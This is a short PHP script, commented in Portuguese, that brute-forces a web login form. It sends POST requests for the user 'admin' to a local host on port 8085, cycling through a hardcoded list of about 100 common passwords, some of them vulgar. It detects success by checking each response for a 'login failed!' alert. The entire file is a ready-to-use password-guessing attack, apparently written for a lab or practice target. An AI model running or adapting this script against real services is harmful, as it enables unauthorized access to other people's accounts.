<?php

$host = "http://0.0.0.0:8085/";
$username = "admin"; // Altere para o seu nome de usuário

// Lista de senhas a serem testadas
$passwords = [
    "123456", "password", "12345678", "qwerty", "123456789",
    "12345", "1234", "111111", "1234567", "dragon",
    "123123", "baseball", "abc123", "football", "monkey",
    "letmein", "696969", "shadow", "master", "666666",
    "qwertyuiop", "123321", "mustang", "1234567890", "michael",
    "654321", "pussy", "superman", "1qaz2wsx", "7777777",
    "fuckyou", "121212", "000000", "qazwsx", "123qwe",
    "killer", "trustno1", "jordan", "jennifer", "zxcvbnm",
    "asdfgh", "hunter", "buster", "soccer", "harley",
    "batman", "andrew", "tigger", "sunshine", "iloveyou",
    "fuckme", "2000", "charlie", "robert", "thomas",
    "hockey", "ranger", "daniel", "starwars", "klaster",
    "112233", "george", "asshole", "computer", "michelle",
    "jessica", "pepper", "1111", "zxcvbn", "555555",
    "11111111", "131313", "freedom", "777777", "pass",
    "fuck", "maggie", "159753", "aaaaaa", "ginger",
    "princess", "joshua", "cheese", "amanda", "summer",
    "love", "ashley", "6969", "nicole", "chelsea",
    "biteme", "matthew", "access", "yankees", "987654321",
    "dallas", "austin", "thunder", "taylor", "matrix"
];

foreach ($passwords as $password) {
    // Inicializa cURL
    $ch = curl_init();

    // Configura a requisição
    curl_setopt($ch, CURLOPT_URL, $host);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
        'username' => $username,
        'password' => $password,
    ]));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    // Executa a requisição
    $response = curl_exec($ch);
    curl_close($ch);

    // Usa regex para capturar o alerta
    if (preg_match("/<script>alert\('login failed!'\);<\/script>/", $response)) {
        echo "Tentativa com a senha '$password': Login falhou!\n";
    } else {
        echo "Tentativa com a senha '$password': Login bem-sucedido!\n"; // ou trate a resposta de sucesso
    }
}

